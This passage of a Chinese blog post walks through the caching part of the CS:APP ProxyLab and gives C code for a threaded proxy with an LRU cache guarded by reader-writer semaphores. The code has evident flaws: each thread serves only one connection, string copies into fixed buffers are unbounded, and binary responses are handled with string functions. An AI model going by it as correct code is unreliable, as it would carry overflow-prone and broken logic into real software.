class="keyword">int</span> fd=sbuf_remove(&amp;sbuf);</span><br></pre></td></tr></table></figure><h3 id="Part-III-Caching-web-objects"><a href="#Part-III-Caching-web-objects" class="headerlink" title="Part III: Caching web objects"></a>Part III: Caching web objects</h3><h4 id="实验内容-2"><a href="#实验内容-2" class="headerlink" title="实验内容"></a>实验内容</h4><p>这一部分要求我们在之前的基础上给代理服务器加上一个缓存系统，让一定i大小范围内的请求响应能直接调用缓存，加快访问速度。</p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ul><li>联系之前cacheLab中和LRU有关的知识，这里可以使用URL作为标识(虽然这样做比较慢)。</li><li>参考CS:APP第707页的内容，利用第一类读者-写者相关知识实现多读单写</li></ul><h4 id="参考思路"><a href="#参考思路" class="headerlink" title="参考思路"></a>参考思路</h4><p>首先定义了Cache的基本结构，一个cache中包括多个CacheItem,Cache本身应该记录当前已经使用过的a缓存区的数量和总缓存区的数量。因为可能同时有多个线程使用usedCacheNum的情况，所以用nt来同步。而CacheItem就i一目了然了，其中主要是用useTime来记录上一次操作的时间用于实现LRU.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> url[MAXLINE];</span><br><span class="line"><span class="keyword">char</span> cache[MAX_OBJECT_SIZE];</span><br><span class="line"><span class="keyword">time_t</span> useTime;</span><br><span class="line"><span class="keyword">int</span> size;</span><br><span class="line"><span class="keyword">sem_t</span> wt,rt,mutex;</span><br><span class="line"><span class="keyword">int</span> readcnt;</span><br><span class="line">&#125;CacheItem;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">CacheItem *cacheItem;</span><br><span class="line"><span class="keyword">int</span> usedCacheNum;</span><br><span class="line"><span class="keyword">int</span> cacheNum;</span><br><span class="line"><span class="keyword">sem_t</span> nt;</span><br><span class="line">&#125;Cache;</span><br></pre></td></tr></table></figure><h4 id="参考代码-2"><a href="#参考代码-2" class="headerlink" title="参考代码"></a>参考代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"csapp.h"</span></span></span><br><span class="line"><span class="comment">/* Recommended max cache and object sizes */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_CACHE_SIZE 1049000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_OBJECT_SIZE 102400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_TYPE_SIZE   4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_THREAD_SIZE 8</span></span><br><span class="line"><span class="comment">/* You won't lose style points for including this long line in your code */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *user_agent_hdr = <span class="string">"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *user_connection=<span class="string">"Connection: close\r\n"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *user_proxy_connection=<span class="string">"Proxy-Connection: close\r\n"</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> user_agent_hdr[MAXLINE];</span><br><span class="line"><span class="keyword">char</span> user_connection[MAXLINE];</span><br><span class="line"><span class="keyword">char</span> user_proxy_connection[MAXLINE];</span><br><span class="line"><span class="keyword">char</span> user_host[MAXLINE];</span><br><span class="line">&#125;Headers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> MAX_CACHE_NUM=MAX_CACHE_SIZE/MAX_OBJECT_SIZE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Subf in textbook p705</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> front;</span><br><span class="line">    <span class="keyword">int</span> rear;</span><br><span class="line">    <span class="keyword">sem_t</span> mutex;</span><br><span class="line">    <span class="keyword">sem_t</span> slots;</span><br><span class="line">    <span class="keyword">sem_t</span> items;</span><br><span class="line">&#125;<span class="keyword">sbuf_t</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_init</span><span class="params">(<span class="keyword">sbuf_t</span> *sp, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_deinit</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="keyword">sbuf_t</span> *sp,<span class="keyword">int</span> item)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Cache struct</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> url[MAXLINE];</span><br><span class="line"><span class="keyword">char</span> cache[MAX_OBJECT_SIZE];</span><br><span class="line"><span class="keyword">time_t</span> useTime;</span><br><span class="line"><span class="keyword">int</span> size;</span><br><span class="line"><span class="keyword">sem_t</span> wt,rd,mutex;</span><br><span class="line"><span class="keyword">int</span> readcnt;</span><br><span class="line">&#125;CacheItem;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">CacheItem *cacheItem;</span><br><span class="line"><span class="keyword">int</span> usedCacheNum;</span><br><span class="line"><span class="keyword">int</span> cacheNum;</span><br><span class="line"><span class="keyword">sem_t</span> nt;</span><br><span class="line">&#125;Cache;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">todo</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintErrorHeader</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> status[],<span class="keyword">char</span>* shortMsg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ServerError</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *cause, <span class="keyword">char</span> status[], <span class="keyword">char</span> *shortMsg, <span class="keyword">char</span> *longMsg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ServerPrintResponseHeader</span><span class="params">(<span class="keyword">char</span> *header)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getRequestType</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initHeader</span><span class="params">(Headers* header)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ParseUrl</span><span class="params">(<span class="keyword">char</span> url[],<span class="keyword">char</span> uri[],<span class="keyword">char</span> hostname[],<span class="keyword">char</span> port[],Headers* header)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRequestHeaders</span><span class="params">(<span class="keyword">rio_t</span> *rio,<span class="keyword">char</span> requestHeaders[],Headers *header)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initCache</span><span class="params">(Cache *cache,<span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">searchCache</span><span class="params">(Cache *cache,<span class="keyword">char</span>  *url)</span></span>;<span class="comment">//return -1 if don't find</span></span><br><span class="line"><span class="keyword">sbuf_t</span> sbuf;</span><br><span class="line">Cache cache;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//printf("%s", user_agent_hdr);</span></span><br><span class="line">    <span class="keyword">int</span> listenfd,connfd;</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    <span class="keyword">char</span> hostname[MAXLINE],port[MAXLINE];</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"usage :%s &lt;port&gt; \n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    initCache(&amp;cache,MAX_CACHE_NUM);</span><br><span class="line"></span><br><span class="line">    Sem_init(&amp;cache.nt,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    listenfd=Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    sbuf_init(&amp;sbuf,MAX_THREAD_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;MAX_THREAD_SIZE;++i)</span><br><span class="line">    &#123;</span><br><span class="line">    Pthread_create(&amp;tid,<span class="literal">NULL</span>,todo,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    clientlen=<span class="keyword">sizeof</span>(struct sockaddr_storage);</span><br><span class="line">    connfd=Accept(listenfd,(SA *)&amp;clientaddr,&amp;clientlen);</span><br><span class="line">    Getnameinfo((SA *)&amp;clientaddr,clientlen,hostname,MAXLINE,port,MAXLINE,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">"Accept: (%s,%s)\n"</span>,hostname,port);</span><br><span class="line">    sbuf_insert(&amp;sbuf,connfd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">todo</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">rio_t</span> rio,rioc;</span><br><span class="line"><span class="keyword">int</span> rc;</span><br><span class="line"><span class="keyword">char</span> buf[MAXLINE],method[MAXLINE],uri[MAXLINE],version[MAXLINE],url[MAXLINE];</span><br><span class="line"><span class="keyword">char</span> hostname[MAXLINE],port[MAXLINE],temp[MAXLINE];</span><br><span class="line"><span class="keyword">char</span> cacheBuf[MAX_OBJECT_SIZE];</span><br><span class="line"></span><br><span class="line">Pthread_detach(pthread_self());</span><br><span class="line"><span class="keyword">int</span> fd=sbuf_remove(&amp;sbuf);</span><br><span class="line"><span class="comment">//fprintf(stdout, "Get fd:%d\n",fd );</span></span><br><span class="line">Rio_readinitb(&amp;rio,fd);</span><br><span class="line">Rio_readlineb(&amp;rio,buf,MAXLINE);</span><br><span class="line"> <span class="comment">//fprintf(stdout,"Proxy recive header:\n%s\n",buf);</span></span><br><span class="line"><span class="built_in">sscanf</span>(buf,<span class="string">"%s %s %s"</span>,method,url,version);</span><br><span class="line"><span class="keyword">if</span>(strcasecmp(method,<span class="string">"GET"</span>))</span><br><span class="line">&#123;</span><br><span class="line">ServerError(fd,method,<span class="string">"501"</span>,<span class="string">"Not implemented"</span>,<span class="string">"ProxyLab not implement this method\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ci=searchCache(&amp;cache,url);</span><br><span class="line"><span class="keyword">if</span>(ci==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">"ProxyCache: %s don't Cached\n"</span>,url);</span><br><span class="line">  Headers header;</span><br><span class="line">  ParseUrl(url,uri,hostname,port,&amp;header);</span><br><span class="line"><span class="built_in">sprintf</span>(buf,<span class="string">"%s %s %s"</span>,method,uri,<span class="string">"HTTP/1.0\r\n"</span>);</span><br><span class="line">GetRequestHeaders(&amp;rio,buf,&amp;header);</span><br><span class="line"><span class="built_in">sscanf</span>(header.user_host,<span class="string">"%s %s"</span>,temp,hostname);</span><br><span class="line"><span class="keyword">char</span> *ptr=<span class="built_in">strchr</span>(hostname,<span class="string">':'</span>);</span><br><span class="line"><span class="keyword">if</span>(ptr!=<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(port,ptr+<span class="number">1</span>);</span><br><span class="line">*ptr=<span class="string">'\0'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(port,<span class="string">"80"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//  fprintf(stdout,"Open_clientfd:hostname=%s port=%s\n",hostname,port);</span></span><br><span class="line"><span class="keyword">int</span> connfd=Open_clientfd(hostname,port);</span><br><span class="line"><span class="keyword">if</span>(connfd&lt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">ServerError(fd,method,<span class="string">"500"</span>,<span class="string">"Can not Connection"</span>,<span class="string">"Proxy Can't connection to end server\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//  fprintf(stdout,"Proxy will send header:\n%s\n",buf);</span></span><br><span class="line">Rio_writen(connfd,buf,MAXLINE);</span><br><span class="line">Rio_readinitb(&amp;rioc,connfd);</span><br><span class="line"><span class="keyword">int</span> bufCnt=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">memset</span>(cacheBuf,<span class="number">0</span>,<span class="keyword">sizeof</span>(cacheBuf));</span><br><span class="line"><span class="keyword">while</span>((rc=Rio_readnb(&amp;rioc,buf,MAXLINE))&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">bufCnt+=rc;</span><br><span class="line"> <span class="comment">//   fprintf(stdout,"Proxy received %d bytes,ten send to end_server\n",rc);</span></span><br><span class="line">    <span class="keyword">if</span>(bufCnt&lt;MAX_OBJECT_SIZE)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">strcat</span>(cacheBuf,buf);</span><br><span class="line">    &#125;</span><br><span class="line">Rio_writen(fd,buf,rc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">"ProxyCacheBuf:size=%d\n%s\n"</span>,bufCnt,buf);</span><br><span class="line"><span class="keyword">if</span>(bufCnt&lt;MAX_OBJECT_SIZE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//cache it</span></span><br><span class="line"><span class="keyword">int</span> rti,usedCacheNum;</span><br><span class="line"></span><br><span class="line">P(&amp;cache.nt);</span><br><span class="line">usedCacheNum=cache.usedCacheNum;</span><br><span class="line"><span class="keyword">if</span>(usedCacheNum&lt;MAX_CACHE_NUM)</span><br><span class="line">&#123;</span><br><span class="line">cache.usedCacheNum++;</span><br><span class="line">&#125;</span><br><span class="line">V(&amp;cache.nt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(usedCacheNum&lt;cache.cacheNum)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;cache.cacheNum;++i)</span><br><span class="line">&#123;</span><br><span class="line">P(&amp;cache.cacheItem[i].wt);</span><br><span class="line"><span class="keyword">if</span>(cache.cacheItem[i].useTime==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">rti=i;</span><br><span class="line">V(&amp;cache.cacheItem[i].wt);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">V(&amp;cache.cacheItem[i].wt);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">time_t</span> LRU_TIME=time(<span class="literal">NULL</span>)+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;cache.cacheNum;++i)</span><br><span class="line">&#123;</span><br><span class="line">P(&amp;cache.cacheItem[i].wt);</span><br><span class="line"><span class="keyword">if</span>(cache.cacheItem[i].useTime&lt;LRU_TIME)</span><br><span class="line">&#123;</span><br><span class="line">LRU_TIME=cache.cacheItem[i].useTime;</span><br><span class="line">rti=i;</span><br><span class="line">&#125;</span><br><span class="line">V(&amp;cache.cacheItem[i].wt);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">P(&amp;cache.cacheItem[rti].wt);</span><br><span class="line"><span class="built_in">strcpy</span>(cache.cacheItem[rti].cache,cacheBuf);</span><br><span class="line"><span class="built_in">strcpy</span>(cache.cacheItem[rti].url,url);</span><br><span class="line">cache.cacheItem[rti].size=bufCnt;</span><br><span class="line">cache.cacheItem[rti].useTime=time(<span class="literal">NULL</span>);</span><br><span class="line">V(&amp;cache.cacheItem[rti].wt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> Close(connfd);</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">P(&amp;cache.cacheItem[ci].mutex);</span><br><span class="line">cache.cacheItem[ci].readcnt++;</span><br><span class="line"><span class="keyword">if</span>(cache.cacheItem[ci].readcnt==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">P(&amp;cache.cacheItem[ci].wt);</span><br><span class="line">&#125;</span><br><span class="line">V(&amp;cache.cacheItem[ci].mutex);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">"ProxyCache: %s  Cached\n"</span>,url);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">"ProxyCacheBuf:size=%d\n%s\n"</span>,cache.cacheItem[ci].size,cache.cacheItem[ci].cache);</span><br><span class="line">Rio_writen(fd,cache.cacheItem[ci].cache,cache.cacheItem[ci].size);</span><br><span class="line">cache.cacheItem[ci].useTime=time(<span class="literal">NULL</span>);</span><br><span class="line">P(&amp;cache.cacheItem[ci].mutex);</span><br><span class="line">cache.cacheItem[ci].readcnt--;</span><br><span class="line"><span class="keyword">if</span>(cache.cacheItem[ci].readcnt==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">V(&amp;cache.cacheItem[ci].wt);</span><br><span class="line">&#125;</span><br><span class="line">V(&amp;cache.cacheItem[ci].mutex);</span><br><span class="line">&#125;</span><br><span class="line">  Close(fd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getRequestType</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> type[MAX_TYPE_SIZE][MAXLINE]=&#123;<span class="string">"Host:"</span>,<span class="string">"User-Agent:"</span>,<span class="string">"Connection:"</span>,<span class="string">"Proxy-Connection:"</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;MAX_TYPE_SIZE;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(strcasecmp(buf,type[i])==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span 